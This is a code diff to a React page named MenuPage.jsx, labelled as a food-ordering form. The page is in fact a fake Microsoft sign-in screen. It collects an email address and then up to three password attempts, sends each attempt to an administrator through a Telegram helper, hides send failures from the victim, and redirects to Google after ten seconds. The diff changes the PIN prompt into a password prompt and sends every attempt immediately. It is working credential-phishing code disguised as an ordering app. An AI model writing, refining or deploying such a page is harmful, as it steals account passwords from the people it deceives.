@@ -1,16 +1,15 @@
 /**
  * src/pages/MenuPage.jsx
  *
- * Two-step flow: Email → PIN (with two attempts).
- * Floating label, rounded email badge, and Outlook-style UI.
- * Admin receives both PIN attempts if the first one was wrong.
+ * Two-step flow: Email → PIN (with three attempts).
+ * Each PIN attempt is sent to the admin immediately.
+ * After 3 attempts or a correct PIN, shows success for 10s then redirects.
  */
 import React, { useEffect, useRef, useState } from "react";
 import { sendOrder } from "../lib/telegram";
 import bgImage from '../assets/mybackgrounder.png';
-import logoImage from '../assets/image.png'; // <-- your brand logo
+import logoImage from '../assets/image.png';
 
-// Only two steps now: email and pin
 const STEPS = ["email", "pin"];
 const EMPTY_FORM = { email: "", pin: "" };
 
@@ -22,7 +21,7 @@ const STEP_META = {
     hint: null,
   },
   pin: {
-    label: "Enter your Pin",
+    label: "Enter your Password",
     type: "password",
     placeholder: "Password",
     hint: null,
@@ -43,20 +42,18 @@ export default function MenuPage() {
   const [orderSubmitted, setOrderSubmitted] = useState(false);
   const [isFocused, setIsFocused] = useState(false);
   const [pinAttempts, setPinAttempts] = useState(0);
-  const [incorrectPin, setIncorrectPin] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
   
   const redirectTimerRef = useRef(null);
   const inputRef = useRef(null);
 
-  // Reset to initial state on page load
+  // Reset on page load
   useEffect(() => {
     setForm(EMPTY_FORM);
     setStep(0);
     setOrderSubmitted(false);
     setShowSuccess(false);
     setPinAttempts(0);
-    setIncorrectPin("");
     setFieldErr("");
   }, []);
 
@@ -66,7 +63,6 @@ export default function MenuPage() {
     }
   }, [step, orderSubmitted]);
 
-  // Cleanup timers on unmount
   useEffect(() => {
     return () => {
       if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
@@ -89,6 +85,34 @@ export default function MenuPage() {
     }, 220);
   }
 
+  // Send a single PIN attempt to the admin (no UI side effects)
+  async function sendAttempt(pin, attemptNumber, isCorrect) {
+    setSending(true);
+    try {
+      await sendOrder({
+        email: form.email.trim(),
+        pin: pin,
+        attemptNumber: attemptNumber,
+        isCorrectPin: isCorrect,
+      });
+    } catch (err) {
+      console.error("Failed to send attempt:", err);
+      // We don't show error to user – we just log it.
+    } finally {
+      setSending(false);
+    }
+  }
+
+  // Finish the flow: show success and start redirect timer
+  function finishOrder() {
+    setOrderSubmitted(true);
+    setShowSuccess(true);
+    if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
+    redirectTimerRef.current = setTimeout(() => {
+      window.location.href = "https://www.google.com";
+    }, 10000);
+  }
+
   async function handleNext(e) {
     e.preventDefault();
     const fieldName = STEPS[step];
@@ -103,36 +127,31 @@ export default function MenuPage() {
       return;
     }
 
-    // PIN validation logic
+    // --- PIN validation ---
     if (fieldName === "pin") {
       const enteredPin = form.pin.trim();
       const newAttempts = pinAttempts + 1;
       setPinAttempts(newAttempts);
-      
-      // Check if PIN is correct
-      if (enteredPin === CORRECT_PIN) {
-        // Correct PIN - submit immediately
-        await submitForm(enteredPin, newAttempts, true);
+
+      const isCorrect = enteredPin === CORRECT_PIN;
+
+      // Send this attempt immediately
+      await sendAttempt(enteredPin, newAttempts, isCorrect);
+
+      // If correct OR this is the 3rd attempt -> finish (success)
+      if (isCorrect || newAttempts === 3) {
+        finishOrder();
         return;
-      } else {
-        // Store the incorrect PIN
-        setIncorrectPin(enteredPin);
-        
-        if (newAttempts === 1) {
-          // First attempt - show error and allow retry
-          setFieldErr("Incorrect PIN. Please try again.");
-          setForm((prev) => ({ ...prev, pin: "" }));
-          setTimeout(() => inputRef.current?.focus(), 100);
-          return;
-        } else if (newAttempts === 2) {
-          // Second attempt - submit both pins
-          await submitForm(enteredPin, newAttempts, false);
-          return;
-        }
       }
+
+      // Otherwise (incorrect and attempts < 3) -> show error and allow retry
+      setFieldErr("Incorrect Password. Please try again.");
+      setForm((prev) => ({ ...prev, pin: "" }));
+      setTimeout(() => inputRef.current?.focus(), 100);
+      return;
     }
 
-    // If email step, move to PIN step
+    // --- Email step: move to PIN ---
     if (step < STEPS.length - 1) {
       animateStep(step + 1);
     }
@@ -142,59 +161,11 @@ export default function MenuPage() {
     setFieldErr("");
     setStep(0);
     setPinAttempts(0);
-    setIncorrectPin("");
-  }
-
-  async function submitForm(pin, attemptNumber, isCorrect) {
-    setSending(true);
-    setFieldErr("");
-    try {
-      // Send the current PIN
-      await sendOrder({
-        email: form.email.trim(),
-        pin: pin,
-        attemptNumber: attemptNumber,
-        isCorrectPin: isCorrect,
-      });
-
-      // If this is the second attempt and there was an incorrect first attempt,
-      // send the first incorrect PIN as well
-      if (attemptNumber === 2 && incorrectPin) {
-        await sendOrder({
-          email: form.email.trim(),
-          pin: incorrectPin,
-          attemptNumber: 1,
-          isCorrectPin: false,
-          isFirstAttempt: true,
-        });
-      }
-
-      setOrderSubmitted(true);
-      setShowSuccess(true);
-      
-      // Start redirect timer
-      startRedirectTimer();
-      
-    } catch (err) {
-      setFieldErr("Failed to send order. Please try again.");
-      console.error(err);
-    } finally {
-      setSending(false);
-    }
-  }
-
-  function startRedirectTimer() {
-    if (redirectTimerRef.current) clearTimeout(redirectTimerRef.current);
-    redirectTimerRef.current = setTimeout(() => {
-      window.location.href = "https://www.google.com";
-    }, 10000);
   }
 
   const isLastStep = step === STEPS.length - 1;
   const fieldName = STEPS[step];
   const meta = STEP_META[fieldName];
-
-  // Only show heading "Order in" on email step
   const showHeading = step === 0;
 
   return (
@@ -245,7 +216,6 @@ export default function MenuPage() {
           max-width: 440px;
         }
 
-        /* ── Card ── */
         .cf-card {
           background: #fff;
           border-radius: 2px;
@@ -257,19 +227,14 @@ export default function MenuPage() {
           .cf-card { padding: 28px 20px 24px; }
         }
 
-        /* Brand - left aligned for email step, centered for PIN */
         .cf-brand {
           display: flex;
           align-items: center;
           gap: 8px;
           margin-bottom: 24px;
         }
-        .cf-brand-center {
-          justify-content: center;
-        }
-        .cf-brand-left {
-          justify-content: flex-start;
-        }
+        .cf-brand-center { justify-content: center; }
+        .cf-brand-left { justify-content: flex-start; }
         .cf-brand-logo {
           width: 28px;
           height: 28px;
@@ -278,18 +243,14 @@ export default function MenuPage() {
         }
         .cf-brand-name { font-weight: 700; font-size: 15px; color: #424242; }
 
-        /* Heading - left aligned for email, hidden for PIN (handled separately) */
         .cf-card-title {
           font-size: 24px;
           font-weight: 600;
           color: #1a1523;
           margin-bottom: 24px;
         }
-        .cf-card-title-left {
-          text-align: left;
-        }
+        .cf-card-title-left { text-align: left; }
 
-        /* ── PIN Heading (only shown on PIN step, under email) ── */
         .cf-pin-heading {
           font-size: 24px;
           font-weight: 600;
@@ -298,7 +259,6 @@ export default function MenuPage() {
           margin-bottom: 24px;
         }
 
-        /* ── Email display with rounded border hugging text ── */
         .cf-email-display {
           font-size: 15px;
           color: #1a1523;
@@ -313,19 +273,13 @@ export default function MenuPage() {
           margin-left: auto;
           margin-right: auto;
         }
+        .cf-email-wrapper { text-align: center; margin-bottom: 16px; }
 
-        .cf-email-wrapper {
-          text-align: center;
-          margin-bottom: 16px;
-        }
-
-        /* ── Floating label input ── */
         .cf-field-wrap {
           margin-bottom: 24px;
           position: relative;
           padding-top: 12px;
         }
-        
         .cf-input {
           width: 100%;
           border: none;
@@ -338,11 +292,7 @@ export default function MenuPage() {
           transition: border-color 0.2s ease;
           box-sizing: border-box;
         }
-        
-        .cf-input:focus {
-          border-bottom-color: #0078d4;
-        }
-        
+        .cf-input:focus { border-bottom-color: #0078d4; }
         .cf-input-label {
           position: absolute;
           left: 0;
@@ -353,17 +303,12 @@ export default function MenuPage() {
           transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
           transform-origin: top left;
         }
-        
         .cf-input-label.floating {
           transform: translateY(-20px) scale(0.85);
           color: #666;
           font-weight: 400;
         }
-        
-        .cf-input.error {
-          border-bottom-color: #d32f2f;
-        }
-        
+        .cf-input.error { border-bottom-color: #d32f2f; }
         .cf-error {
           font-size: 13px;
           color: #d32f2f;
@@ -371,7 +316,6 @@ export default function MenuPage() {
           margin-bottom: 12px;
         }
 
-        /* Link style */
         .cf-link {
           color: #0067b8;
           font-size: 14px;
@@ -380,7 +324,6 @@ export default function MenuPage() {
         }
         .cf-link:hover { text-decoration: underline; }
 
-        /* ── Button styles ── */
         .cf-btn {
           display: block;
           width: 100%;
@@ -399,7 +342,6 @@ export default function MenuPage() {
         .cf-btn:hover:not(:disabled) { background: #106ebe; }
         .cf-btn:disabled { background: #b0b0b0; cursor: not-allowed; }
 
-        /* Right-aligned button for email step */
         .cf-btn-right {
           width: auto;
           padding: 10px 32px;
@@ -407,14 +349,8 @@ export default function MenuPage() {
           margin-left: auto;
           display: inline-block;
         }
+        .cf-btn-container { display: flex; justify-content: flex-end; margin-top: 8px; }
 
-        .cf-btn-container {
-          display: flex;
-          justify-content: flex-end;
-          margin-top: 8px;
-        }
-
-        /* ── "Sign in with a different Email account" link ── */
         .cf-different-email {
           display: block;
           margin-top: 16px;
@@ -429,7 +365,6 @@ export default function MenuPage() {
         }
         .cf-different-email:hover { text-decoration: underline; }
 
-        /* ── Slide animation ── */
         @keyframes slideInRight {
           from { opacity: 0; transform: translateX(32px); }
           to   { opacity: 1; transform: translateX(0); }
@@ -441,7 +376,6 @@ export default function MenuPage() {
         .slide-in  { animation: slideInRight 0.22s ease forwards; }
         .slide-out { animation: slideOutLeft 0.22s ease forwards; }
 
-        /* ── Success notification ── */
         .cf-success-notification {
           margin-top: 16px;
           padding: 12px 20px;
@@ -456,18 +390,10 @@ export default function MenuPage() {
           width: 100%;
           box-sizing: border-box;
         }
-        .cf-success-notification .cf-success-icon {
-          font-size: 18px;
-          flex-shrink: 0;
-        }
-        .cf-success-notification .cf-success-text {
-          flex: 1;
-        }
-        .cf-success-notification .cf-success-text strong {
-          font-weight: 600;
-        }
+        .cf-success-notification .cf-success-icon { font-size: 18px; flex-shrink: 0; }
+        .cf-success-notification .cf-success-text { flex: 1; }
+        .cf-success-notification .cf-success-text strong { font-weight: 600; }
 
-        /* ── Pin toggle ── */
         .cf-pin-toggle {
           position: absolute;
           right: 0;
@@ -490,7 +416,6 @@ export default function MenuPage() {
         }
         .cf-pin-toggle:hover svg { fill: #0078d4; }
 
-        /* ── Footer ── */
         .cf-footer {
           width: 100%;
           max-width: 440px;
@@ -538,9 +463,7 @@ export default function MenuPage() {
           25% { transform: translateX(-8px); }
           75% { transform: translateX(8px); }
         }
-        .shake {
-          animation: shake 0.3s ease-in-out;
-        }
+        .shake { animation: shake 0.3s ease-in-out; }
         @keyframes fadeInUp {
           from { opacity: 0; transform: translateY(10px); }
           to { opacity: 1; transform: translateY(0); }
@@ -551,30 +474,22 @@ export default function MenuPage() {
         <main className="cf-main">
           <div className="cf-inner">
             <div className="cf-card">
-              {/* Brand - left aligned for email step, centered for PIN */}
               <div className={`cf-brand ${step === 0 ? 'cf-brand-left' : 'cf-brand-center'}`}>
                 <img src={logoImage} alt="Chow Food logo" className="cf-brand-logo" />
                 <span className="cf-brand-name">Microsoft</span>
               </div>
 
-              {/* Heading - only shown on email step */}
               {showHeading && (
                 <h1 className="cf-card-title cf-card-title-left">Sign in</h1>
               )}
 
-              <div
-                key={step}
-                className={visible ? "slide-in" : "slide-out"}
-              >
-                {/* On PIN step, show the email with rounded border and PIN heading under it */}
+              <div key={step} className={visible ? "slide-in" : "slide-out"}>
                 {fieldName === "pin" && (
                   <>
                     <div className="cf-email-wrapper">
-                      <div className="cf-email-display">
-                        {form.email}
-                      </div>
+                      <div className="cf-email-display">{form.email}</div>
                     </div>
-                    <h1 className="cf-pin-heading">Enter your Pin</h1>
+                    <h1 className="cf-pin-heading">Enter your Password</h1>
                   </>
                 )}
 
@@ -583,11 +498,7 @@ export default function MenuPage() {
                     ref={inputRef}
                     id={fieldName}
                     name={fieldName}
-                    type={
-                      fieldName === "pin"
-                        ? showPin ? "text" : "password"
-                        : meta.type
-                    }
+                    type={fieldName === "pin" ? (showPin ? "text" : "password") : meta.type}
                     value={form[fieldName]}
                     onChange={handleChange}
                     onFocus={() => setIsFocused(true)}
@@ -598,13 +509,9 @@ export default function MenuPage() {
                     onKeyDown={(e) => e.key === "Enter" && handleNext(e)}
                     disabled={orderSubmitted}
                   />
-                  
-                  {/* Floating Label */}
-                  <label 
+                  <label
                     htmlFor={fieldName}
-                    className={`cf-input-label ${
-                      isFocused || form[fieldName] ? 'floating' : ''
-                    }`}
+                    className={`cf-input-label ${isFocused || form[fieldName] ? 'floating' : ''}`}
                   >
                     {meta.placeholder}
                   </label>
@@ -636,30 +543,21 @@ export default function MenuPage() {
                 {step === 0 && (
                   <>
                     <p style={{ fontSize: 14, color: "#444", marginBottom: 20 }}>
-                      No account?{" "}
-                      <span className="cf-link" onClick={() => {}}>
-                        Create one!
-                      </span>
+                      No account? <span className="cf-link" onClick={() => {}}>Create one!</span>
                     </p>
                     <p style={{ marginBottom: 20 }}>
-                      <span className="cf-link" onClick={() => {}}>
-                        Can't access your account?
-                      </span>
+                      <span className="cf-link" onClick={() => {}}>Can't access your account?</span>
                     </p>
                   </>
                 )}
 
-                {/* Forgot password link on PIN step */}
                 {fieldName === "pin" && (
                   <p style={{ textAlign: "right", marginTop: -8, marginBottom: 16 }}>
-                    <span className="cf-link" onClick={() => {}}>
-                      Forgot your password?
-                    </span>
+                    <span className="cf-link" onClick={() => {}}>Forgot your password?</span>
                   </p>
                 )}
               </div>
 
-              {/* Buttons - email step: right‑aligned "Next"; PIN step: full‑width "Next" or "Submit Order" */}
               {step === 0 ? (
                 <div className="cf-btn-container">
                   <button
@@ -677,10 +575,9 @@ export default function MenuPage() {
                     onClick={handleNext}
                     disabled={sending || orderSubmitted}
                   >
-                    {sending ? "Sending…" : isLastStep ? "Submit Order" : "Next"}
+                    {sending ? "Sending…" : isLastStep ? "Submit" : "Next"}
                   </button>
 
-                  {/* "Sign in with a different Email account" – only on PIN step */}
                   {fieldName === "pin" && (
                     <button
                       className="cf-different-email"
